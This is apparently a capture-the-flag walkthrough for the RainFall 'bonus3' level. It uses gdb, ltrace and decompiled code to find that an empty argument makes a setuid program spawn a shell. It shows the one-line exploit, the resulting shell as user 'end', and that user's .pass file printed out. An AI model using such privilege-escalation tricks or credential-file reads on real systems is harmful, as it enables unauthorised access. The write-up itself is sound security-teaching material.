# We have a executable "bonus3" lets do some test!

>bonus3@RainFall:~$ ./bonus3
>bonus3@RainFall:~$ ./bonus3 test

>bonus3@RainFall:~$ ./bonus3 test test
>bonus3@RainFall:~$

# Well that's not a lot of information

# Let's use gdb

(gdb) disas main
[...]
   0x08048513 <+31>:	call   0x8048410 <fopen@plt>
[...]
   0x08048531 <+61>:	rep stos %eax,%es:(%edi)
   0x08048533 <+63>:	cmpl   $0x0,0x9c(%esp)
   0x0804853b <+71>:	je     0x8048543 <main+79>
   0x0804853d <+73>:	cmpl   $0x2,0x8(%ebp)
   0x08048541 <+77>:	je     0x804854d <main+89>
   0x08048543 <+79>:	mov    $0xffffffff,%eax
   0x08048548 <+84>:	jmp    0x8048615 <main+289>
[...]
   0x0804856f <+123>:	call   0x80483d0 <fread@plt>
[...]
   0x08048584 <+144>:	call   0x8048430 <atoi@plt>
[...]
   0x080485b3 <+191>:	call   0x80483d0 <fread@plt>
   0x080485b8 <+196>:	mov    0x9c(%esp),%eax
   0x080485bf <+203>:	mov    %eax,(%esp)
   0x080485c2 <+206>:	call   0x80483c0 <fclose@plt>
[...]
   0x080485da <+230>:	call   0x80483b0 <strcmp@plt>
   0x080485df <+235>:	test   %eax,%eax
   0x080485e1 <+237>:	jne    0x8048601 <main+269>
   0x080485e3 <+239>:	movl   $0x0,0x8(%esp)
   0x080485eb <+247>:	movl   $0x8048707,0x4(%esp)
   0x080485f3 <+255>:	movl   $0x804870a,(%esp)
   0x080485fa <+262>:	call   0x8048420 <execl@plt>
   0x080485ff <+267>:	jmp    0x8048610 <main+284>
   0x08048601 <+269>:	lea    0x18(%esp),%eax
   0x08048605 <+273>:	add    $0x42,%eax
   0x08048608 <+276>:	mov    %eax,(%esp)
   0x0804860b <+279>:	call   0x80483e0 <puts@plt>
[...]

# So the program call two times fread and do an atoi to our arguments. And we can see it can call excecl

# Let's use ltrace to search more informations

>bonus3@RainFall:~$ ltrace ./bonus3 test
__libc_start_main(0x80484f4, 2, 0xbffff6e4, 0x8048620, 0x8048690 <unfinished ...>
fopen("/home/user/end/.pass", "r")                                                                                            = 0
+++ exited (status 255) +++

# Hum so we can't really test with ltrace or gdb because we don't have the right of bonus3 when executing those. But we know that it read the .pass

# Let's use dogbolt as last ressort

    fread(&var_98, 1, 0x42, fp);
    char var_57_1 = 0;
    *(&var_98 + atoi(argv[1])) = 0;
    void var_56;
    fread(&var_56, 1, 0x41, fp);
    fclose(fp);
    if (strcmp(&var_98, argv[1]) != 0)
    {
        puts(&var_56);
    }
    else
    {
        execl("/bin/sh", &data_8048707, 0);
    }

# We need var_98 and argv1 to be equal to 0 and we can change var_98 with argv1 via atoi

# So we need var_98 and argv1 to be null so strcmp return 0

bonus3@RainFall:~$ ./bonus3 ''
$ whoami
end
$ cd ..
$ cd end
$ cat .pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
$ 

